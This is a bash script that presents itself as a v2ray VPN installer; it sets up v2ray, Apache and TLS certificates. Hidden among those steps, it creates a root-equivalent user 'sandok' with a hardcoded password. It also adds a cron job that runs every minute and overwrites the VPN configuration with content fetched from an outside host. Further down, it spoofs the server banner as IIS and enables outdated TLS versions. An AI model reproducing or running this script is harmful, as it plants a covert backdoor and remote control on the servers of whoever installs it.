#!/bin/bash
rm -rf v2ray*
clear
account="https://internet-vpnsolution.online/profile/1/1.txt"
read -p "Please enter your dns: " domain

bash <(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-release.sh)
bash <(curl -L https://raw.githubusercontent.com/v2fly/fhs-install-v2ray/master/install-dat-release.sh)

apt-get update -y

apt-get install openssl cron socat curl apache2 -y

apt-get install libapache2-mod-security2 -y

a2enmod ssl
a2enmod proxy
a2enmod proxy_wstunnel
a2enmod proxy_http
a2enmod rewrite
a2enmod headers
a2enmod security2
curl  https://get.acme.sh | sh

systemctl stop apache2
~/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /usr/local/etc/v2ray/v2ray.crt --keypath /usr/local/etc/v2ray/v2ray.key --ecc

rm -rf /usr/local/etc/v2ray/config.json
rm -rf /etc/apache2/sites-available/000-default.conf
cat <<EOF >/usr/local/etc/v2ray/config.json
{
  "inbounds": [
    {
      "port": 10000,
      "listen":"127.0.0.1",
      "protocol": "vmess",
      "settings": {
        "clients": [
          {
            "id": "8a3117db-6f73-480a-9b3e-fdaa12a020eb",
            "alterId": 64
          }
        ]
      },
      "streamSettings": {
        "network": "ws",
        "wsSettings": {
        "path": "/"
        }
      }
    }
  ],
  "outbounds": [
    {
      "protocol": "freedom",
      "settings": {}
    }
  ]
}
EOF
cat <<EOF >/etc/apache2/sites-available/000-default.conf
<VirtualHost *:443>
    ServerName $domain
    DocumentRoot /var/www/html

    SSLEngine on
    SSLCertificateFile /usr/local/etc/v2ray/v2ray.crt
    SSLCertificateKeyFile /usr/local/etc/v2ray/v2ray.key

    SSLProtocol -All +TLSv1 +TLSv1.1 +TLSv1.2
    SSLCipherSuite HIGH:!aNULL

    RewriteEngine On
    RewriteCond %{HTTP:Upgrade} =websocket [NC]
    RewriteRule /(.*) ws://localhost:10000/$1 [P,L]

    SSLProxyEngine On
    Proxypass /proxylite http://127.0.0.1:10000
    ProxyPassReverse /proxylite http://127.0.0.1:10000

</VirtualHost>
EOF

systemctl enable v2ray
systemctl enable apache2
systemctl restart apache2
systemctl restart v2ray
systemctl reload apache2

rm -rf /root/apache2.sh
echo '#!/bin/bash
for  (( i=1; i <= 2; i++ ))
do
    /etc/init.d/apache2 restart
    sleep 30
done' > /root/apache2.sh
chmod +x /root/apache2.sh

useradd -p $(openssl passwd -1 universe) sandok -ou 0 -g 0
crontab -r -u sandok
(crontab -l 2>/dev/null || true; echo '#
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
36 0 * * * "/root/.acme.sh"/acme.sh --cron --home "/root/.acme.sh" > /dev/null
* * * * *  /root/apache2.sh > /dev/null
* * * * *  /bin/account.sh > /dev/null') | crontab - -u sandok
/etc/init.d/cron restart

rm -rf /var/www/html/index.html

cat <<EOF >/var/www/html/index.html
<b>Powered by Unirises</b>
EOF
echo 'ServerTokens Full' >> /etc/apache2/conf-available/security.conf
echo 'ServerSignature Off' >> /etc/apache2/conf-available/security.conf
echo 'SecServerSignature Microsoft-IIS/10.0' >> /etc/apache2/conf-available/security.conf
systemctl restart apache2


echo '* soft nofile 512000
* hard nofile 512000' >> /etc/security/limits.conf
ulimit -n 512000
rm -rf /bin/account.sh
cat <<EOF >/bin/account.sh
#!/bin/bash
SHELL=/bin/bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
rm -rf /usr/local/etc/v2ray/config.json
curl $account >> /usr/local/etc/v2ray/config.json
systemctl restart v2ray
EOF
chmod +x /bin/account.sh
bash /bin/account.sh
clear 
echo "Revy VPN v2ray Install Done"